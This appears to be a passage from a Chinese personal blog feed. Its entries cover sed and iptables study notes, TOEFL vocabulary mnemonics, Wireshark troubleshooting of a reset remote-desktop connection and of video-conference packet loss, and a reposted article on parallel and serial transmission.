nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 15 dbus:x:81:81:System message bus:/:/sbin/nologin 16 polkitd:x:999:998:User for polkitd:/:/sbin/nologin 17 ntp:x:38:38::/etc/ntp:/sbin/nologin 18 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 chrony:x:998:996::/var/lib/chrony:/sbin/nologin 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# [root@vultr ~]# nl /etc/passwd | sed '2,20d' 1 root:x:0:0:root:/root:/bin/bash 21 tcpdump:x:72:72::/:/sbin/nologin sed ‘2a 字符串’，在第2行后面插入一字符串，i表示在第n行前插入字符串 12345678910111213141516171819202122[root@vultr ~]# nl /etc/passwd | sed '2,20d' |sed '1a nihaoa' 1 root:x:0:0:root:/root:/bin/bashnihaoa 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# [root@vultr ~]# [root@vultr ~]# nl /etc/passwd | sed '2,20d' |sed '1i nihaoa'nihaoa 1 root:x:0:0:root:/root:/bin/bash 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# [root@vultr ~]# [root@vultr ~]# nl /etc/passwd | sed '2,20d' |sed '2i nihaoa' 1 root:x:0:0:root:/root:/bin/bashnihaoa 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# [root@vultr ~]# [root@vultr ~]# nl /etc/passwd | sed '2,20d' |sed '20i nihaoa' 1 root:x:0:0:root:/root:/bin/bash 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# 想要增加多行，可以先输入\，然后回车，就会跳转到下一行。 1234567891011121314[root@vultr ~]# nl /etc/passwd | sed '2,19d' |sed '2a nihaoa \&gt;zaijian' 1 root:x:0:0:root:/root:/bin/bash 20 chrony:x:998:996::/var/lib/chrony:/sbin/nologinnihaoa &gt;zaijian 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# [root@vultr ~]# nl /etc/passwd | sed '2,19d' |sed '2a nihaoa \&gt; zaijian' 1 root:x:0:0:root:/root:/bin/bash 20 chrony:x:998:996::/var/lib/chrony:/sbin/nologinnihaoa zaijian 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# 4.2替代sed ‘2,19c 字符串’，c表示从2到19行被该字符串替代掉 123456[root@vultr ~]# nl /etc/passwd | sed '2,19c 2 to 19 no show' 1 root:x:0:0:root:/root:/bin/bash2 to 19 no show 20 chrony:x:998:996::/var/lib/chrony:/sbin/nologin 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# sed -n ‘2,4p’，表示显示第2到第4行，-n参数需要加上 123456789101112131415161718192021222324252627282930[root@vultr ~]# nl /etc/passwd | sed '2,4p' 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 operator:x:11:0:operator:/root:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 15 dbus:x:81:81:System message bus:/:/sbin/nologin 16 polkitd:x:999:998:User for polkitd:/:/sbin/nologin 17 ntp:x:38:38::/etc/ntp:/sbin/nologin 18 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 chrony:x:998:996::/var/lib/chrony:/sbin/nologin 21 tcpdump:x:72:72::/:/sbin/nologin[root@vultr ~]# [root@vultr ~]# nl /etc/passwd | sed -n '2,4p' 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin sed ‘s/需要被替代的字符串/替换后的字符串/g’ 4.3直接在文本中做修改操作]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[iptables笔记]]></title>
    <url>%2F2019%2F08%2F11%2Fiptables%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[iptables笔记 朱双印博客-iptables规则 数据经过防火墙流程图 1.查找规则 iptables -t 表名 -L iptables -t 表名 -L 链名 #-L显示链名下的表名规则 iptables -t 表名 -vL 链名 #-v显示详细信息 iptables -t 表名 -nvL 链名 #-n不进行地址解析 iptables -t 表名 -xnvL 链名 #-x显示精确计数值 iptables –line -t 表名 -xnvL 链名 #–line在规则前加上序列号 2.添加规则 iptables -t 表名 -A 链名 匹配条件 -j 动作 iptables -t filter -A INPUT -s 192.168.1.1 -j DROP #-A插入到规则最后 iptables -t 表名 -I 链名 匹配条件 -j 动作 iptables -t filter -I INPUT -s 192.168.1.1 -j ACCEPT #-I插入到规则开头 iptables -t 表名 -I 链名 规则序号 匹配条件 -j 动作 iptables -t filter -I INPUT 5 -s 192.168.1.1 -j REJECT #在第五行规则中插入 iptables -t 表名 -P 链名 动作 iptables -t filter -P INPUT REJECT #设置INPUT链中filter表的默认规则 3.删除规则 按规则序号删除iptables -t 表名 -D 链名 规则序号 iptables -t filter -D INPUT 5 按匹配条件与动作删除 iptables -t 表名 -D 链名 匹配条件 -j 匹配动作 iptables -t filter -D INPUT -s 192.168.1.1 -j ACCEPT 删除某个链下指定表的所有规则 iptables -t 表名 -F 链名 iptables -t filter -F INPUT 删除所有链下指定表的所有规则 iptables -t 表名 -F iptables -t filter -F 4.修改规则如果要修改规则，必须要指明原规则中的匹配条件（或者理解为只能修改动作） iptables -t 表名 -R 链名 规则序号 规则原始匹配条件 -j 动作 iptables -t filter -R INPUT 3 -S 192.168.1.1 -J ACCEPT 另外一种方式是，先删除规则。再在原来的位置添加规则 5.保存规则 6.匹配条件6.1基本匹配条件 -s用于匹配源IP地址。可以指定多个IP地址，多个IP地址间用“，”号隔开；也可以指定IP网段 iptables -t filter -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP iptables -t filter -I INPUT -s 192.168.1.0/24 -j ACCEPT iptables -t filter -I INPUT ! -s 192.168.1.0/24 -j ACCEPT -d用于匹配目的IP地址。可以指定多个IP地址，多个IP地址间用“，”号隔开；也可以指定IP网段 iptables -t filter -I OUTPUT -d 192.168.1.111,192.168.1.118 -j DROP iptables -t filter -I INPUT -d 192.168.1.0/24 -j ACCEPT iptables -t filter -I INPUT ! -d 192.168.1.0/24 -j ACCEPT -p用于匹配协议类型，常见的匹配类型有TCP、UDP、ICMP、ESP、AH等 iptables -t filter -I INPUT -p tcp -s 192.168.1.146 -j ACCEPT iptables -t filter -I INPUT ! -p udp -s 192.168.1.146 -j ACCEPT -i表示从哪个网卡接口流入本机，不能用于output链和postrouting链 -o表示从哪个网卡接口流出本机，不能用于prerouting链和input链 6.2扩展匹配条件(如果协议和扩展模块一致，扩展模块可省略)TCP扩展模块： -p tcp -m tcp –sport，用于匹配协议源端口，可以用冒号”:”指定一个连续的端口范围(udp类似) -p tcp -m tcp –dport，用于匹配协议目的端口，可以用冒号”:”指定一个连续的端口范围（udp类似） iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp --sport 22 -j REJECT iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 22:25 -j REJECT iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport :22 -j REJECT iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 80: -j REJECT iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp ! --sport 22 -j ACCEPT –tcp-flags用于匹配tcp头部中的标志位 iptables -t filter -I INPUT -p tcp -m tcp --dport 22 --tcp-flags SYN,ACK,FIN,RST,URG,PSH SYN -j REJECT iptables -t filter -I OUTPUT -p tcp -m tcp --sport 22 --tcp-flags SYN,ACK,FIN,RST,URG,PSH SYN,ACK -j REJECT iptables -t filter -I INPUT -p tcp -m tcp --dport 22 --tcp-flags ALL SYN -j REJECT iptables -t filter -I OUTPUT -p tcp -m tcp --sport 22 --tcp-flags ALL SYN,ACK -j REJECT –syn,相当于使用了“–tcp-flags SYN,ACK,FIN,RST SYN” iptables -t filter -I INPUT -p tcp -m tcp --dport 22 --syn -j REJECT multiport扩展模块： -p tcp -m multiport –sports，用于匹配协议源端口，可以用逗号”,”指定多个离散端口 -p tcp -m multiport –dports，用于匹配协议目的端口，可以用逗号”,”指定多个离散端口 iptables -t filter -I OUTPUT -d 192.168.1.146 -p udp -m multiport --sports 137,138 -j REJECT iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80 -j REJECT iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport ! --dports 22,80 -j REJECT iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 80:88 -j REJECT iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80:88 -j REJECT icmp扩展模块（略） state扩展模块（略，但是概念重要） 7.匹配动作 动作SNAT，进行源地址转换(公网是固定IP) iptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 公网IP 动作MASQUERADE，进行源地址转换（公网是动态IP） iptables -t nat -A POSTROUTING -s 10.1.0.0/16 -o eth0 -j MASQUERADE 动作DNAT，进行目的地址转换 iptables -t nat -I PREROUTING -d 公网IP -p tcp --dport 公网端口 -j DNAT --to-destination 私网IP:端口号 iptables -t nat -I PREROUTING -d 公网IP -p tcp --dport 8080 -j DNAT --to-destination 10.1.0.1:80 iptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 公网IP 动作REDIRECT，进行本机端口重定向 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[新东方赵丽托福英语词汇8000-01]]></title>
    <url>%2F2019%2F07%2F18%2F%E6%96%B0%E4%B8%9C%E6%96%B9%E8%B5%B5%E4%B8%BD%E6%89%98%E7%A6%8F%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%878000-01%2F</url>
    <content type="text"><![CDATA[新东方赵丽托福英语词汇8000-01共30词 compel repel insidious assist timid toxic compulsive repulsive preside resist intimidate intoxicate compulsion repulsion resident insist Fawn Pawn expel impel Vigor persist Spawn Brawn propel dispel invigorate Lawn Yawn Dawn 4.词根词缀法词根:(本义) body 前缀:改变含义不变词性 anti(反)+body(体)-抗体 后缀:改变词性,不变含义 pass passable 词性转换库: pel表示推（verb）—pulsive（形容词）—pulsion（名词） compel （com共同+pel） verb:强迫，迫使 The law can compel fathers to make regular payments for their children.这项法律可强制父亲定期支付子女的费用。 compulsive( adjective ):难以制止的；难控制的 compulsive eating/spending/gambling强迫性进食╱消费；上瘾的赌博 The programme made compulsive viewing.这节目引人入胜，收看起来欲罢不能。 compulsion（noun）:强迫；强制 compulsion(on sb) to do sth There are no compulsions on students to attend classes.没有强求学生上课。 repel(re向后+pel) verb:击退；驱逐 Troops repelled an attempt to infiltrate the south of the island.部队挫败了对该岛南部的潜入企图。 expel (ex老大+pel) verb:把…开除（或除名）;驱逐出境;排出；喷出 1.She was expelled from school at 15.她 15 岁时被学校开除了。 2.Foreign journalists are being expelled.外国记者被驱逐出境。 impel (im内心深处+pel) verb:迫使(激励) He felt impelled to investigate further.他觉得有必要作进一步调查。 propel (pro向前+pel) verb:推动；驱动；推进 He succeeded in propelling the ball across the line.他成功地把球带过线。 Fury propelled her into action.怒火驱使她行动起来。 dispel(dis分开+pel) verb:驱散，消除（尤指感觉或信仰） His speech dispelled any fears about his health.他的发言消除了人们对他身体健康的担心。]]></content>
      <categories>
        <category>英语</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[新东方赵丽托福英语词汇8000-00]]></title>
    <url>%2F2019%2F07%2F15%2F%E6%96%B0%E4%B8%9C%E6%96%B9%E8%B5%B5%E4%B8%BD%E6%89%98%E7%A6%8F%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%878000-00%2F</url>
    <content type="text"><![CDATA[新东方赵丽托福英语词汇8000-00共18词 haunt flaunt daunt vaunt gaunt jaunt journey saunter taunt ponderous slurp drone quaff ambition schedule pajama famine sanguine 1.拆分法—aunt系列haunt(home+aunt) verb:(鬼魂)出没;(不快的事情)萦绕 1.A headless rider haunts the country lanes.一个无头骑士常出没于乡间的小路上。 2.The memory of that day still haunts me.我的脑海中常常回想起那天的情景。 noun:常来常往的地方 The pub is a favourite haunt of artists.这家酒吧是艺术家最爱光顾的地方。 flaunt(fly+aunt) verb:炫耀，夸耀 He did not believe in flaunting his wealth.他不相信摆阔有什么好处。 daunt(da打+aunt) verb:恐吓；使胆怯；使气馁；使失去信心 She was a brave woman but she felt daunted by the task ahead.她是一个勇敢的女人，但对面前的任务却感到信心不足。 vaunt(v5+aunt) 不及物动词夸耀, 吹嘘[…] [of, over, about]~ of one’s skill夸耀自己的技巧 可数名词自夸, 夸张, 吹嘘make a ~ of﹍ 夸耀… gaunt(gre+aunt) adjective:瘦削憔悴的（常因疾病、饥饿或忧虑） a gaunt face憔悴的面容 jaunt(接+aunt) noun:短途旅行 a weekend jaunt 周末小旅行 ps:journey接你：长途旅行 saunter(see+aunter)姑姑到处乱看 verb:闲逛 He sauntered by, looking as if he had all the time in the world.他悠闲地走过，仿佛时间对他来说是无穷无尽的。 taunt(吐，呸+aunt) verb:辱骂；嘲笑 The other kids continually taunted him about his size.其他孩子不断地耻笑他的个头儿。 noun:嘲笑（或讽刺、奚落等）的言辞 Black players often had to endure racist taunts.黑人运动员经常得忍受种族歧视性的奚落。 2.谐音联想法ponderous(胖的要死) adjective:笨重的，缓慢的 She watched the cow’s ponderous progress.她看着牛迟缓地向前走着。 slurp(嗖的一下) verb:（喝东西时）发出啧啧的声音 He was slurping his tea.他正咂着嘴喝茶。 drone(juan～juan～,蜜蜂等嗡嗡的声音) noun:嗡嗡声 the distant drone of traffic远处车辆往来发出的嗡嗡声 quaff(夸父追日饮一河之水；马和骡子kuafukuafu喝水的声音) verb:豪饮；痛饮；开怀畅饮 ambition(俺必胜) noun:追求的目标;野心 1.It had been her lifelong ambition.这是她终身追求的目标。 2.She was intelligent but suffered from a lack of ambition.她很聪明，但却缺乏远大志向。 3.拼音联想法schedule(s+che+du+le,该死的车又堵了，我们不得不改变我们的计划表) noun:工作计划；日程安排 I have a hectic schedule for the next few days.我今后几天的日程紧得要命。 pajama(pa+ja+ma,趴在家妈妈穿的) noun:睡衣 famine(fa+mi+ne,发米呢) noun:饥荒 a severe famine严重饥荒 sanguine(san+gui+ne,三桂呢) adjective:充满信心的；乐观的;面色红润的 hey are less sanguine about the company’s long-term prospects.他们对公司的远景不那么乐观。]]></content>
      <categories>
        <category>英语</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[远程桌面访问不了]]></title>
    <url>%2F2019%2F07%2F07%2F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%2F</url>
    <content type="text"><![CDATA[远程桌面访问不了问题：总部PC去访问分支的服务器3389桌面，会出现不定时中断的问题 10.0.2.132为PC 10.16.2.200为远程桌面的服务器 拓扑环境 总部有三层环境，AC透明模式部署，分支二层环境，就一个网段 数据包是总部访问分支访问不了的时候抓取的数据包，要求通过数据包，分析问题原因。 排查思路： 只抓取了分支vpn上eth0口的包和总部vpn设备eth0上的包（建议是分支电脑和总部服务器都抓取，抓不了也没 办法） 因为是终端pc访问服务器的时候经常断开。所以先看在终端侧的数据包，也即是查看zbssleth0这个包 打开之后，先点击Statistics，选中conversation 出现下图界面，选中TCP，看到存在三个连接。说明应该是测试过3次。其中注意到字节数Bytes， 第二个连接有112kB，比其他连接传输的数据都多，那我们就先来看这个连接。 怎么看呢？右键该连接后，照下图操作 wireshark自动过滤该连接，显示如下界面 我们可以点开专家分析来看看，是否存在什么问题。点开之后，记得把Limit to Display ﬁlter 给勾上，这样才会显示在wireshark过滤后展示页面的信息。 由于不涉及访问卡慢的问题，所以此时我们没必要看重传等信息。重点应该关注是什么导致的连接 断开。此时，明显能看到告警信息中，存在RST包，那我们就可以看下304号包与306号包。 找到304号包与306包后，发现后面就再也没有数据了，说明此时连接是中断了。明明数据传的好好 的，怎么突然客户端10.0.2.132就发送一个RST包呢。此时需要注意的是，我们的数据包是在总部vpn设备上eth0口抓的，也就是说这个流量是从内部传过来的。结合着总部的拓扑情况，出现中断， 可能存在2种情况。要么是客户端自己的问题，要么就是有啥子设备替客户端发送了这个RST包。 一个直接的办法就是在客户端上抓包。看下客户端有没有发出这个RST包。如果没有，结合着网络拓 扑，那基本就可以确定是AC发了这个RST包了（第一个，客户环境比较简单；第二个，谁叫AC是行 为管控呢）。如果客户端上的抓包有这个RST，那就是客户端的问题。 如果客户说，我电脑上不能安装其他软件（不管为啥，你就当死活不允许好了）。那就是说，我们 不能在客户端上抓包。那好，我们就只能在现有的数据包中获取蛛丝马迹了。 此时，我们还有一个方法判断是不是由客户端发出的这个RST包，那就是通过IP.ID这个参数。 IP.ID是什么鬼？那我们要知道数据包是如何封装的，如下图所示。如果看不懂，请参考网络基本功。IP.ID是IP数据报头中的一个字段。表明了一个数据包的身份，比如一个数据内容过大，被传输的时候就要对这个数据进行切割，即进行分片。当接收方收到这些分片后，需要把这些分片组装起来，那接收方每次收这么多的数据包，它咋知道哪些分片是从同一个数据内容中出来的呢？就要靠IP.ID了，通过IP.ID就可以把这些分片组装起来，还原成最初始的大块数据。就像你玩乐高玩具，乐 高里面这么多零件，如果这些零件中混入了其他玩具的零件。那你想把这个乐高玩具组装起来肯定需要一个标识来进行识别哪些零件是同属于一个乐高模型的。 上述还只是告诉了你，啥是IP.ID。那回到问题中来，你还需要知道的一个点就是，如果是一个设备 去发数据包，那么他的IP.ID增长是线性的。即一般来说，同一台设备发出第一个包，如果IP.ID是1， 第二个包就是2。就算不符合这规律，那数值起码也不会差太多。 我们再来看下wireshark，299号包的IP.ID=18970。302号包的IP.ID=18971。而304号包的IP.ID=22566。那RST包和之前的两个包，这数值也差的太多了啊，所以基本能判断这个包不是客户端发出的。]]></content>
      <categories>
        <category>实战</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[视频会议卡顿]]></title>
    <url>%2F2019%2F06%2F13%2F%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E5%8D%A1%E9%A1%BF%2F</url>
    <content type="text"><![CDATA[视频会议卡顿——用wireshark定位问题基础知识（TCP和UDP的比较） TCP报文和UDP报文如下 在报文头部中，我们可以知道，TCP除了源目端口，还会有seq号，ack号，6个标志位以及一个接受窗口字段。而UDP报文头部只有源目端口，长度和校验和字段。UDP报文头部8字节，TCP的最短报文头部20字节，UDP报文头部连TCP头部长度的一半都不到，想复杂也复杂不起来。 我们知道TCP是需要建立连接后才会开始传输数据的，而UDP不用。TCP就像打电话，必须先拨通对方手机，然后才互相交流，如果对方没有听清，那自己就可以把话语重复一遍，确保对方接收无误。UDP就像发短信，我给一个人发送短信后，第一不会知道对方是否有收到；即便对方收到后，我也不知道信息发给对方有没有出错。 在TCP中，假设有很长一段数据要发送，假设有4380（1460*3）字节的数据。我们知道在以太网中，以太网帧的数据部分最大长度是1500字节，假设TCP和IP头部各占20字节，那么一个TCP段的数据就是1460字节，超过这个字节就要分段。所以这4380个字节就要分成3个包去发送。这3个包就类似于下表，假设第一个包的seq号是0，那么下一个包的seq号就是1460（上一个包的seq号+长度）。 包号 seq号 lenth长度 1 0 1460 2 1460 1460 3 2920 1460 正常情况下，接收方要收到这3个包。假设第二个包在传输过程中丢失了，接收方只能收到seq号是0（长度是1460字节）和seq号是2920（1460字节）的包，那他就清楚1460的这个包在路上丢失了，就可以要发送方重传第二个包。 对于UDP而言，它没有建立连接的机制，同时也没有流控和差错控制机制。那它要发送数据出去，如果数据部分超过了最大的数据长度1472字节（以太网帧的数据部分最大长度是1500字节，IP头部20字节，UDP头部8字节），就要靠下层的IP来分片。分片要如何组装起来，在之前的文章中提到过，涉及的就是ip.id和片偏移。 如果数据部分没有超过UDP中的最大数据长度，就不会被分片，那么每个报文的ip.id也就是不一样的。 也就是说在UDP中，发送方发送一个小数据出去，接收方收到就收到了，没收到那我也不知道，也不会重传。 而发送方要是发送一个大数据（超过UDP最大数据长度，会有多个分片），如果有一个分片丢失，那么接收方按ip.id和片偏移无法组装起来，那么就会向发送方发送消息，让发送方重传。此时的重传不会像TCP一样，只发送丢弃的那个包，而是要把之前这个包的所有分片全部重传。 客户问题 左边是分支，右边是总部。分支的视频服务器上看总部端的画面很流程，但是在总部的视频服务器上看分支端的画面则特别卡。 客户拓扑 问题分析 视频会议和语音通话基本都是使用UDP协议。同时数据字节不会很大，一般不会超过最大UDP数据报文长度，那么每个数据包ip.id的值是不一样的。不会出现设备收到分片组装不起来的情况。 分支的视频服务器看总部的画面正常，说明总部给分支传的UDP数据流是没有丢包的。 总部的视频服务器看分支画面有卡顿，说明分支给总部传的UDP数据流可能存在丢包。 总部和分支之间互传数据是互不干扰的。因为不是TCP下，建立连接后的两端数据互传。 两台设备上都做了策略路由，视频服务器的流量都走了联通线路。（其实最开始的情况是，分支到总部的数据往电信线路传了，总部往分支的数据就走了联通，存在总部看分支画面丢包的情况。怀疑是线路问题，就调整了策略，让数据都走了联通，但是问题还是存在。） 查看两端的控制台配置，策略都是正常的。出现丢包的时候，经过设备的流量都不大，cpu利用率也不高。 于是在客户两端都开启视频服务器的情况下，抓包分析。 先看分支的内网口（eth0）的抓包情况。 由于是总部看分支，画面存在卡顿。那我们主要关注的就是分支视频服务器172.17.160.8给总部视频服务器10.16.121.250这个方向的流量 选择B到A这个方向。选择完后，主界面就会自动给你过滤出分支视频服务器给总部视频服务器这个方向的流量 由于画面存在卡顿，很可能的原因是丢包。UDP不像TCP那样，有所谓的seq号。在TCP中，哪个包丢了，我可以通过seq号把丢的包找到，但UDP不行。那有没有什么办法可以让UDP像TCP一样，能给这些数据包按顺序编个号吗？哪个UDP包丢了，我可以通过这个编号识别到。 是可以的。那就是把UDP的数据包编码为RTP的数据包，对RTP协议感兴趣的同学可以看这篇文章实时传输协议RTP/RTCP 我们来看下把UDP包编码成RTP包在wireshark中是啥样的。 上图看到，其实所谓的编码，是把UDP包中的数据部分变成了RTP数据报文，RTP数据报文中存在seq号。 我们在会话统计中可以看到分支给总部传数据的时候，建立了6个连接。其中前2个连接的数据量相对大一些。 为什么前2个连接，传输的数据多些呢？ 我们先选择第一个连接，即端口49152到端口2326的。把这个连接使用的UDP协议编码为RTP协议 编码之后，此时wireshark界面如图所示 接下来，我们打开RTP流分析。可以看到面板已经给我们统计出有2个丢包了，你还能分析出是丢了哪两个包。 16.由于是打开的分支eth0接口的抓包，所以此时就可以说明，丢包是丢在了内网 按照同样的方法，我们还要查看下在公网链路上是否存在丢包，以及在总部内网是否存在丢包。 因为分支内网存在丢包，所以在查看公网链路上的数据包时（即fzeth3和zbeth2），如果公网数据包中，丢包的序列号和在fzeth0数据包内的一致，说明公网是没有丢包的。如果除去内网中丢包的序列号，还有其他序列号丢失，说明公网链路也有问题。 从fzeth3的数据包中，可以看到丢了2个，也是seq=34591和seq=34637丢包了。和内网抓包fzeth0丢包情况一致。而在总部设备的2个口抓包情况也是一样的，就不赘述了。查看方法和上述一致。 定位了问题后，可以判断分支内网存在丢包。那么有条件的话就可以在分支视频服务器及交换机上抓包对比查看。 最后定位出的问题是交换机网口有问题，换一个交换机问题就解决了。]]></content>
      <categories>
        <category>实战</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[并行/串行/异步传输]]></title>
    <url>%2F2019%2F06%2F12%2F%E5%B9%B6%E8%A1%8C-%E4%B8%B2%E8%A1%8C-%E5%BC%82%E6%AD%A5%E4%BC%A0%E8%BE%93%2F</url>
    <content type="text"><![CDATA[【转载】什么是并行传输、串行传输、异步传输？ 文章收录自互联网，著作权归原作者所有，若有冒犯请联系我删除。 商业转载请联系作者获得授权，非商业转载请注明出处。 本人转载只作个人学习及后续查阅使用 该篇文档作者：航空航天迷 原文链接：什么是并行传输、串行传输、异步传输？ 来源：知乎 传输可以分为串行传输和并行传输。 串行传输可分为异步传输、同步传输和等时传输。 下图2是并行传输的示意图： 在并行传输中，使用多根并行的数据线一次同时传输多个比特。 例如在图2中，共有8根数据线，一次同时传输8个比特，每个比特占用一根数据线。 下图3是串行传输的示意图： 在串行传输中，使用一根数据线传输数据，一次传输1个比特，多个比特需要一个接一个依次传输。 下面简单介绍一下串行传输与并行传输的发展历史，从而了解他们俩各自的优缺点，以及发展趋势。 最早的计算机（电子管计算机和晶体管计算机），其各个接口，例如输入接口、输出接口和存储器接口等，一般采用串行接口，以串行传输的方式传输数据。 下图4为电子管计算机ENIAC 电子管计算机ENIAC诞生于美国宾夕法尼亚大学。重30多吨，占地约170平方米，装有约18000只电子管。 下图5为电子管计算机中使用的电子管 图5中小玻璃瓶状的东西就是电子管，电子管的体积比较大 下图6为晶体管计算机TRADIC 1954年，贝尔实验室使用800只晶体管组装了世界上第一台晶体管计算机TRADIC。相比电子管，晶体管体积小、重量轻、寿命长、发热少、功耗低，大大改进了计算机中的电子线路的结构，大幅度提高了运算速度。 下图7为晶体管计算机TRADIC中使用的晶体管 电子管计算机和晶体管计算机以串行传输的方式传输数据，其原因是当时各个部件都是分立的部件，而不是像今天这样使用集成电路设计。如果采用并行线路的话，元件的数量和占用的空间将成倍增长。比如，一个8比特并行线路的元件数量是串行线路的元件数量的8倍（因为需要为每根线路配置一套接收元件）。另外，元件的数量成倍增长的话，耗电量也会大幅增加。 集成电路技术出现后，大量元件可以集成到一个小小的芯片上，并行传输变得方便而便宜。不论是8比特、16比特还是更高比特位数的并行线路，只需要一个并行接口芯片就可以处理，而且并行接口芯片只比串行接口芯片贵一点。 除了方便便宜外，在相同的工作频率下并行传输的传输速度是串行传输的数倍，迎合了人们对速度的追求，所以硬盘、打印机等设备开始使用并行传输以提高传输速度。PATA（Parallel Advanced Technology Attachment，并行高级技术附件）接口、并口（Parallel Port）和PCI（Peripheral Component Interconnect，外设部件互连）接口成为流行的并行接口。 下图8为电脑主板上的PATA接口（并行传输），用于连接硬盘和光驱 下图9为用于PATA接口的连接线缆 下图10中的编号2为电脑上的并口（并行传输），用于连接打印机、扫描仪等 下图11为电脑主板上的PCI接口（并行传输），用于插接外置网卡、声卡、显卡和调制解调器卡等） 下图12为采用PCI接口的显卡 图12中的显卡使用时是插入图11中的PCI接口（插槽）中。 在相同的工作频率下并行传输的传输速度是串行传输的数倍，但并行线路有一些难以克服的缺点，导致依靠并行线路的并行传输无法用于长距离通信。计算机与外界的长距离通信，例如与网络中的另外一台计算机进行通信时，只能使用串行传输。 在计算机内部，如今串行传输也显示出了它的优势，有取代并行传输的趋势。 例如， SATA接口取代PATA接口； USB接口取代并口； PCI Express接口取代PCI接口。 为什么串行传输有取代并行传输的趋势呢？ 与串行传输相比，并行传输的缺点是： 一、线路的成本高 并行传输如果每个时钟节拍发送16个比特，则需要16根数据线（另外还需要多根控制线）。 PATA（并行传输）连接线缆包含40根导线（16根数据线，24根用于接地和进行控制）； SATA（串行传输）连接线缆包含7根导线（4数据线+3接地线）。 如果是长距离通信，并行传输的线路成本是串行传输的若干倍。 另外，只有一对传输线时，串行传输也可以实现双向通信，所以可以直接利用现有的电话线路进行数据传输；而并行传输要多根并行的传输线，没有现有的线路可以利用，要另外专门铺设线路，成本高。 二、体积大 并行接口占用空间大，对应线缆占用空间也大。 如图14所示，PATA的接口与连接线缆的尺寸大大于SATA的接口与连接线缆的尺寸 如果是长距离通信，要求使用比较粗的信号线，以便降低信号的衰减，并行传输需要使用多根较粗的信号线捆扎在一起组成通信线缆，占很大空间。 即使是计算机内部通信，并行传输的线缆所占用的空间也比串行传输的线缆所占用的空间大很多。 并行接口的尺寸比串行接口的尺寸大很多，则不利于设备的小型化。例如，在手机和穿戴式设备等领域，希望零件的尺寸越小越好。 三、信号线之间的干扰大，不能用于长距离传输 并排的信号线在进行高速传输时，会在每条信号线的周围产生微弱的电磁场，出现串音干扰，进而影响到其它信号线中的数据传输。传输距离越长，串音干扰越严重。 所以，PATA线缆的长度不能超过0.4米，而SATA线缆可以达到1米。 四、并行传输具有同步问题 并行传输中，如果并行的线路之间的物理性质不一致，例如长度上有细微差别，会导致并行线路中传输的比特不是同时到达接收方，接收器接收数据时容易出错。 五、传输频率低 在并行传输中，如果传输频率高的话，数据线之间会产生很大的干扰，造成数据出错，即使为数据线添加屏蔽层，也不能保证屏蔽掉高频率产生的干扰。所以，并行传输的最高传输频率有一定限制。 PATA接口的最高传输频率为33MHz，这个几乎已经达到了并行接口的极限。 串行传输每次只传输一个比特，但是它的传输频率可以非常高，达到10GHz，是33MHz的300倍。相当于并行传输每发送1次，串行传输可以发送300次。并行传输每次发送300比特，才能赶上串行传输的速度，但是每次发送300比特，就需要300根并行的数据线，这是不现实的。 